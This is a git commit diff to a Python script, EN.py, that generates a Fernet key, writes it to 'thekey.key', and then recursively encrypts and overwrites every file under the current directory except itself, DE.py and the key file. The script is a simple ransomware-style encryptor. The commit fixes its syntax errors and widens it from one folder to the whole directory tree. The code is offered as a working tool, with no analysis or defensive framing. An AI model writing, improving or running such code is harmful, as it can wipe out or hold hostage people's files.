896b132aaef10f3ca2b4e4d2305d288817b98f01
Kadefrfr <153398756+Kadefrfr@users.noreply.github.com>
2023-12-16 20:00:56 -0600

    EN.py

--- EN.py
+++ EN.py
@@ -3,28 +3,26 @@
 import os
 from cryptography.fernet import Fernet
 
-
+def encrypt_file(file_path, key):
+    with open(file_path, "rb") as thefile:
+        contents = thefile.read()
+    contents_encrypted = Fernet(key).encrypt(contents)
+    with open(file_path, "wb") as thefile:
+        thefile.write(contents_encrypted)
 
 files = []
 
-for file in os.listdir()
-	if file == "EN.py", or file == "thekey.key", o file == "DE.py":
-		continue
-	if os.path.isfile(file):
-		files.append(file)
-
+for root, _, filenames in os.walk('.'):
+    for filename in filenames:
+        if filename in ["EN.py", "thekey.key", "DE.py"]:
+            continue
+        file_path = os.path.join(root, filename)
+        files.append(file_path)
 
 key = Fernet.generate_key()
 
 with open("thekey.key", "wb") as thekey:
-	thekey.write(key)
+    thekey.write(key)
 
-
-
-for file in files:
-	with open(file, "rb") as thefile:
-		contents = thefile.read()
-	contents_encrypted = Fernet(key).encrypt(contents)
-	with open(file, "wb") as thefile:
-		thefile.write(contents_encrypted)
-
+for file_path in files:
+    encrypt_file(file_path, key)
